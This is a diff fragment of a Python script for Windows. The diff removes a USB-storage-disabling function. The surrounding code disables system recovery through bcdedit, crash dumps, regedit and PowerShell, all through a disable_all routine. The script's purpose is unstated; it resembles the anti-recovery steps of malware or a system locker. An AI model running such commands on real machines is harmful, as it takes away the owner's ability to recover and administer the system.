@@ -73,12 +73,6 @@ def disable_recovery():
     execute_command("bcdedit /set {default} recoveryenabled No")
 
 
-def disable_usb_boot():
-    reg_path = r"SYSTEM\CurrentControlSet\Services\USBSTOR"
-    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as reg:
-        winreg.SetValueEx(reg, "Start", 0, winreg.REG_DWORD, 4)
-
-
 def disable_ram_dump():
     reg_path = r"System\CurrentControlSet\Control\CrashControl"
     with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as reg:
@@ -435,7 +429,6 @@ def execute_command(command, shell=True):
 
 def disable_all():
     disable_ram_dump()
-    disable_usb_boot()
     disable_regedit()
     disable_powershell()
     disable_recovery()
